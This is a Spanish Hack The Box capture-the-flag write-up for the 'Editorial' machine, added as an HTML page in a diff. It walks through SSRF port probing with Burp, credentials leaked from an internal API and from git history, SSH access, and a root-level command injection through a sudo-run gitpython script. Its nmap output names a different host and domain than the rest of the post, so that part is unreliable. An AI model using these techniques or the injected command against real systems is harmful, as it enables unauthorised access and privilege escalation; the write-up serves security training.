@@ -1,0 +1,615 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Editorial - Easy - Hacktivo.io</title>
+<meta name="description" content="Hola a todos, hoy les presentaré la resolución de una máquina Hack the box de dificultad Easy. En esta máquina aprenderemos a detectar un SSRF para luego conectarnos por SSH y llegar a ser root abusando de privilegios a nivel de Sudoers">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacktivo.io">
+<meta property="og:title" content="Editorial - Easy">
+<meta property="og:url" content="http://localhost:4000/editorial-easy/">
+
+
+  <meta property="og:description" content="Hola a todos, hoy les presentaré la resolución de una máquina Hack the box de dificultad Easy. En esta máquina aprenderemos a detectar un SSRF para luego conectarnos por SSH y llegar a ser root abusando de privilegios a nivel de Sudoers">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/2024-08-07-editorial-easy/Editorial.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2024-08-07T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/editorial-easy/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "0x832",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacktivo.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/0x832.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Editorial - Easy</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="0x832" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">0x832</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentesting y programación
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/0x832" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Editorial - Easy">
+    <meta itemprop="description" content="Hola a todos, hoy les presentaré la resolución de una máquina Hack the box de dificultad Easy. En esta máquina aprenderemos a detectar un SSRF para luego conectarnos por SSH y llegar a ser root abusando de privilegios a nivel de Sudoers">
+    <meta itemprop="datePublished" content="August 07, 2024">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Editorial - Easy
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2024-08-07T00:00:00+02:00">August 07, 2024 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/2024-08-07-editorial-easy/Editorial.png" alt="" /></p>
+
+<p>Hola a todos, hoy les presentaré la resolución de una máquina <strong>Hack the box de dificultad Easy</strong>. En esta máquina aprenderemos a detectar un <strong>SSRF</strong> para luego conectarnos por <strong>SSH</strong> y llegar a ser <strong>root abusando de privilegios a nivel de Sudoers</strong>”</p>
+
+<p><br /></p>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+<ul>
+  <li>
+    <p>Enumeración con nmap</p>
+
+    <p>Hacemos un <code class="language-plaintext highlighter-rouge">nmap</code> simple para ver los puertos que corren en la máquina</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1"># nmap -p- -sS --min-rate 5000 -T5 -Pn -vvv -oN nmap.txt 10.10.11.20
+</span>  <span class="n">Increasing</span> <span class="n">send</span> <span class="n">delay</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.20</span> <span class="k">from</span> <span class="mi">0</span> <span class="n">to</span> <span class="mi">5</span> <span class="n">due</span> <span class="n">to</span> <span class="mi">235</span> <span class="n">out</span> <span class="n">of</span> <span class="mi">587</span> <span class="n">dropped</span> <span class="n">probes</span> <span class="n">since</span> <span class="n">last</span> <span class="n">increase</span><span class="p">.</span>
+  <span class="nb">Warning</span><span class="p">:</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.20</span> <span class="n">giving</span> <span class="n">up</span> <span class="n">on</span> <span class="n">port</span> <span class="n">because</span> <span class="n">retransmission</span> <span class="n">cap</span> <span class="n">hit</span> <span class="p">(</span><span class="mi">2</span><span class="p">).</span>
+  <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.20</span>
+  <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">user</span><span class="o">-</span><span class="nb">set</span> <span class="p">(</span><span class="mf">0.61</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
+  <span class="n">Scanned</span> <span class="n">at</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">06</span> <span class="mi">00</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">27</span> <span class="n">CEST</span> <span class="k">for</span> <span class="mi">39</span><span class="n">s</span>
+  <span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">55285</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">),</span> <span class="mi">10248</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+  <span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">REASON</span>
+  <span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
+  <span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
+    
+  <span class="n">Read</span> <span class="n">data</span> <span class="n">files</span> <span class="k">from</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">nmap</span>
+</code></pre></div>    </div>
+
+    <p>Una vez acaba el escaneo vemos los puertos abiertos, que en este caso como podemos ver es el <code class="language-plaintext highlighter-rouge">22(SSH)</code> y el <code class="language-plaintext highlighter-rouge">80(HTTP)</code></p>
+
+    <p>Ahora  le aplicamos un <code class="language-plaintext highlighter-rouge">nmap</code> más exhaustivo a dichos puertos</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">#nmap -p22,80 -sVC -vvv -oN port.txt 10.10.11.19
+</span>  <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.19</span>
+  <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">echo</span><span class="o">-</span><span class="n">reply</span> <span class="n">ttl</span> <span class="mi">63</span> <span class="p">(</span><span class="mf">1.2</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
+  <span class="n">Scanned</span> <span class="n">at</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">06</span> <span class="mi">00</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">56</span> <span class="n">CEST</span> <span class="k">for</span> <span class="mi">59</span><span class="n">s</span>
+    
+  <span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>    <span class="n">REASON</span>         <span class="n">VERSION</span>
+  <span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">tcpwrapped</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
+  <span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span>
+  <span class="o">|</span>   <span class="mi">3072</span> <span class="mi">3</span><span class="n">e</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="n">d5</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">2</span><span class="n">e</span><span class="p">:</span><span class="mi">61</span><span class="p">:</span><span class="n">eb</span><span class="p">:</span><span class="mi">8</span><span class="n">f</span><span class="p">:</span><span class="n">a6</span><span class="p">:</span><span class="mi">3</span><span class="n">b</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">2</span><span class="n">a</span><span class="p">:</span><span class="n">b7</span><span class="p">:</span><span class="mi">1</span><span class="n">c</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="n">d3</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+  <span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">rsa</span> <span class="n">AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf</span><span class="o">+</span><span class="n">Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N</span><span class="o">/</span><span class="mi">17</span><span class="o">+</span><span class="n">rIZkSmdZPQi8chG</span><span class="o">/</span><span class="n">PyZ</span><span class="o">+</span><span class="n">H1FqcFB2LyxrynHCBLPTWyuN</span><span class="o">/</span><span class="n">tXkaVoDH</span><span class="o">/</span><span class="n">aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR</span><span class="o">+</span><span class="n">t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk</span><span class="o">/</span><span class="n">K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq</span><span class="o">+</span><span class="n">rYtd</span><span class="o">+</span><span class="n">DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ</span><span class="o">/</span><span class="n">IF1cIyfzo1gicwVcLm4iRD9umBFaM2E</span><span class="o">=</span>
+  <span class="o">|</span>   <span class="mi">256</span> <span class="mi">39</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">3</span><span class="n">f</span><span class="p">:</span><span class="mi">0</span><span class="n">c</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="n">d7</span><span class="p">:</span><span class="mi">2</span><span class="n">f</span><span class="p">:</span><span class="mi">1</span><span class="n">b</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="n">e0</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">d</span><span class="p">:</span><span class="mi">85</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+  <span class="o">|</span> <span class="n">ecdsa</span><span class="o">-</span><span class="n">sha2</span><span class="o">-</span><span class="n">nistp256</span> <span class="n">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB</span><span class="o">/</span><span class="n">Pupk38CIbFpK4</span><span class="o">/</span><span class="n">RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw</span><span class="o">=</span>
+  <span class="o">|</span>   <span class="mi">256</span> <span class="n">b0</span><span class="p">:</span><span class="mi">6</span><span class="n">f</span><span class="p">:</span><span class="n">a0</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="p">:</span><span class="n">df</span><span class="p">:</span><span class="n">b1</span><span class="p">:</span><span class="mi">7</span><span class="n">a</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">78</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="n">ec</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+  <span class="o">|</span><span class="n">_ssh</span><span class="o">-</span><span class="n">ed25519</span> <span class="n">AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO</span><span class="o">/</span><span class="n">Vs6yPUw6ibE6gvOuakAnmR7gTk</span><span class="o">/</span><span class="n">yE2yJA</span><span class="o">/</span><span class="mi">3</span>
+  <span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">tcpwrapped</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
+  <span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">app</span><span class="p">.</span><span class="n">blurry</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span>
+  <span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span>
+  <span class="o">|</span><span class="n">_</span>  <span class="n">Supported</span> <span class="n">Methods</span><span class="p">:</span> <span class="n">GET</span> <span class="n">HEAD</span> <span class="n">POST</span> <span class="n">OPTIONS</span>
+  <span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="p">.</span><span class="mi">0</span>
+    
+  <span class="n">Read</span> <span class="n">data</span> <span class="n">files</span> <span class="k">from</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">nmap</span>
+  <span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="p">.</span>
+</code></pre></div>    </div>
+
+    <p>Como podemos observar vemos que el puerto <code class="language-plaintext highlighter-rouge">80</code> aplica un <code class="language-plaintext highlighter-rouge">redirect</code> a <a href="http://app.blurry.htb/"><code class="language-plaintext highlighter-rouge">http://app.blurry.htb/</code></a> lo cual nos hace pensar que tendremos que ponerlo en el <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled.png" alt="Untitled" /></p>
+
+    <p>## Ahora accedemos a la web para poder determinar que clase de vulnerabilidades podemos encontrar
+      
+  Vamos a acceder a la web, ya que como hemos visto anteriormente, el <code class="language-plaintext highlighter-rouge">puerto 80</code> está abierto</p>
+
+    <p>Podemos observar varias cosas, pero si  accedemos a esta sección de la web podemos observar esto de aquí</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%202.png" alt="Untitled" /></p>
+
+    <p>Podríamos pensar en una subida de archivos, pero no es el caso, pero otra cosa que nos llama la atención es que podemos introducir una <code class="language-plaintext highlighter-rouge">URL</code> lo cual nos hace pensar  en un <code class="language-plaintext highlighter-rouge">SSRF</code>(<strong>Server-Side Request Forgery</strong>)</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%203.png" alt="Untitled" /></p>
+
+    <h1 id="explotación-del-ssrf">Explotación del <code class="language-plaintext highlighter-rouge">SSRF</code></h1>
+
+    <p>Empecemos rellenando el formulario de esta manera , pero ponemos http://127.0.0.1 para intentar apuntar a la máquina interna</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%204.png" alt="Untitled" /></p>
+
+    <p>Mandamos la petición y la interceptamos con <code class="language-plaintext highlighter-rouge">burp</code>. Una vez la hecho eso lo enviamos al <code class="language-plaintext highlighter-rouge">repeter</code> , al enviar la petición podemos observar que nos sale una ruta de una <code class="language-plaintext highlighter-rouge">imagen.jpg</code></p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%205.png" alt="Untitled" /></p>
+
+    <p>Una vez sabemos que es vulnerable a <code class="language-plaintext highlighter-rouge">SSRF</code> podemos intentar listar puertos abiertos de la máquina local, para poder listar dichos puertos mandaremos la petición al <code class="language-plaintext highlighter-rouge">intruder</code></p>
+
+    <p>Añadiremos <code class="language-plaintext highlighter-rouge">:puerto_probar</code>y le daremos a <code class="language-plaintext highlighter-rouge">Add §</code></p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%206.png" alt="Untitled" /></p>
+
+    <p>Nos crearemos un documento con <code class="language-plaintext highlighter-rouge">top 200 puertos</code>para probar</p>
+
+    <p>Le daremos a <code class="language-plaintext highlighter-rouge">Payload</code> y añadiremos el fichero con los puertos</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%207.png" alt="Untitled" /></p>
+
+    <p>Una vez configurado esto , iremos a <code class="language-plaintext highlighter-rouge">setting</code> bajaremos hasta la opción <code class="language-plaintext highlighter-rouge">Grep-Extract</code> le daremos a <code class="language-plaintext highlighter-rouge">Add</code> y seleccionaremos la ruta de la imagen para que muestre todas las respuestas que tengan esa ruta</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%208.png" alt="Untitled" /></p>
+
+    <p>Y le daremos a <code class="language-plaintext highlighter-rouge">StartAttack</code></p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%209.png" alt="Untitled" /></p>
+
+    <p>Una vez finaliza el ataque  podemos observar que el puerto <code class="language-plaintext highlighter-rouge">5000</code> tiene otro <code class="language-plaintext highlighter-rouge">Lenght</code> diferente</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2010.png" alt="Untitled" /></p>
+
+    <p>Si lo mandamos al <code class="language-plaintext highlighter-rouge">Repeter</code> y mandamos la solicitud, vemos una respuesta totalmente diferente a las demás  </p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2011.png" alt="Untitled" /></p>
+
+    <p>Vamos a ver que es esto de aquí</p>
+
+    <p>Aplicamos un <code class="language-plaintext highlighter-rouge">curl</code> para descargar lo que hemos encontrado</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2012.png" alt="Untitled" /></p>
+
+    <p> Una vez descargado el archivo, hacemos esta instalación 
+      
+  <code class="language-plaintext highlighter-rouge">apt install jq</code> para poder visualizar el archivo de mejor forma</p>
+
+    <p>Podemos observar los puntos finales de una <code class="language-plaintext highlighter-rouge">API</code> lo cual nos puede ser útil para hacer peticiones e intentar encontrar alguna  información 
+  interesante. En este caso nos llama mucho la atención de <code class="language-plaintext highlighter-rouge">new_authors</code></p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2013.png" alt="Untitled" /></p>
+
+    <p>Nos copiamos la ruta de <code class="language-plaintext highlighter-rouge">new_authors</code> interceptamos la petición como hicimos al principio y en vez de poner solo <code class="language-plaintext highlighter-rouge">5000</code> le añadimos la ruta.</p>
+
+    <p>Vemos que nos da otra archivo</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2014.png" alt="Untitled" /></p>
+
+    <p>Nos lo descargamos</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">curl</span> <span class="o">-</span><span class="n">O</span> <span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">editorial</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">static</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">c51085e1</span><span class="o">-</span><span class="n">b565</span><span class="o">-</span><span class="mi">4</span><span class="n">d03</span><span class="o">-</span><span class="mi">8</span><span class="n">c2a</span><span class="o">-</span><span class="n">c8ed92decbea</span><span class="p">](</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">editorial</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">static</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">c51085e1</span><span class="o">-</span><span class="n">b565</span><span class="o">-</span><span class="mi">4</span><span class="n">d03</span><span class="o">-</span><span class="mi">8</span><span class="n">c2a</span><span class="o">-</span><span class="n">c8ed92decbea</span><span class="p">)</span>
+</code></pre></div>    </div>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2015.png" alt="Untitled" /></p>
+
+    <p>Y vemos que hay un <code class="language-plaintext highlighter-rouge">user</code> y <code class="language-plaintext highlighter-rouge">password</code></p>
+
+    <h1 id="acceso-a-la-máquina-con-ssh">Acceso a la máquina con ssh</h1>
+
+    <p>Con la contraseña y password encontrada podemos intentar acceder al ssh.</p>
+
+    <p>Y efectivamente estamos dentro</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2016.png" alt="Untitled" /></p>
+
+    <p>Aplicamos un <code class="language-plaintext highlighter-rouge">ls -la</code> y encontramos el <code class="language-plaintext highlighter-rouge">user.txt</code>, ya tenemos la primera <strong>flag</strong></p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2017.png" alt="Untitled" /></p>
+
+    <h1 id="escalada-a-root">Escalada a <code class="language-plaintext highlighter-rouge">root</code></h1>
+
+    <p>Vemos una carpeta llamada <code class="language-plaintext highlighter-rouge">apps</code> lo cual entramos por curiosidad</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2019.png" alt="Untitled" /></p>
+
+    <p>Y encontramos una carpeta llamada <code class="language-plaintext highlighter-rouge">.git</code> lo cual podría haber información interesante</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2020.png" alt="Untitled" /></p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2021.png" alt="Untitled" /></p>
+
+    <p>Si nos ponemos a mirar los logs del <code class="language-plaintext highlighter-rouge">.git</code> aplicando el comando <code class="language-plaintext highlighter-rouge">git log</code> encontramos mucha información, pero si miramos un poco vemos algo que nos llama la atención, que nos dice que puede haber <strong>información de acceso a la editorial</strong></p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2022.png" alt="Untitled" /></p>
+
+    <p><code class="language-plaintext highlighter-rouge">git show 1e84a036b2f33c59e2390730699a488c65643d28</code> vemos que nos da bastante información, pero si vamos bajando acabamos encontrando esto de aquí un <code class="language-plaintext highlighter-rouge">user</code> y una <code class="language-plaintext highlighter-rouge">password</code></p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2023.png" alt="Untitled" /></p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2024.png" alt="Untitled" /></p>
+
+    <p>Probamos si esas credenciales funcionan en el ssh <code class="language-plaintext highlighter-rouge">usuario y password</code> y efectivamente funcionan</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2024.5.png" alt="Untitled" /></p>
+
+    <p>Si aplicamos un <code class="language-plaintext highlighter-rouge">sudo -l</code> nos pedirá <code class="language-plaintext highlighter-rouge">password</code> , pero pondremos la de usuario</p>
+
+    <p>Podemos observar que hay posibilidad de <code class="language-plaintext highlighter-rouge">escalar a root abusando de privilegios a nivel de Sudoers</code></p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2025.png" alt="Untitled" /></p>
+
+    <p>Nos dirigimos a la ruta del programa Python</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2026.png" alt="Untitled" /></p>
+
+    <p>Vemos que el script utiliza <code class="language-plaintext highlighter-rouge">bibliotecas git</code> para realizar la operación de clonación</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2027.png" alt="Untitled" /></p>
+
+    <p>Si miramos la <code class="language-plaintext highlighter-rouge">versión de gitpython</code> que usa el programa vemos esto</p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2028.png" alt="Untitled" /></p>
+
+    <p>Para poder explotar la vulnerabilidad aplicaremos este comando, que lo que hace es ejecutar el programa a nivel de sudoers y ejecuta una Shell que copia el <code class="language-plaintext highlighter-rouge">/root/root.txt</code> en <code class="language-plaintext highlighter-rouge">/tmp/root</code>
+   </p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">internal_apps</span><span class="o">/</span><span class="n">clone_changes</span><span class="o">/</span><span class="n">clone_prod_change</span><span class="p">.</span><span class="n">py</span> <span class="s">'ext::sh -c cat% /root/root.txt% &gt;% /tmp/root'</span>    
+</code></pre></div>    </div>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2029.png" alt="Untitled" /></p>
+
+    <p>Y si hacemos un <code class="language-plaintext highlighter-rouge">ls /tmp/root</code> dentro del archivo <code class="language-plaintext highlighter-rouge">root</code> tenemos <code class="language-plaintext highlighter-rouge">flag</code></p>
+
+    <p><img src="/assets/images/2024-08-07-editorial-easy/Untitled%2030.png" alt="Untitled" /></p>
+
+    <h1 id="finalización">Finalización</h1>
+    <p>Espero que hayan aprendido mucho haciendo esta máquina y les haya servido de ayuda mi explicación para poder entender esta <strong>CTF</strong>. Muchas gracias por leer el artículo y no olviden seguirme en <a href="https://github.com/0x832/">GitHub</a>, ya que también iré subiendo herramientas de hacking.</p>
+  </li>
+</ul>
+
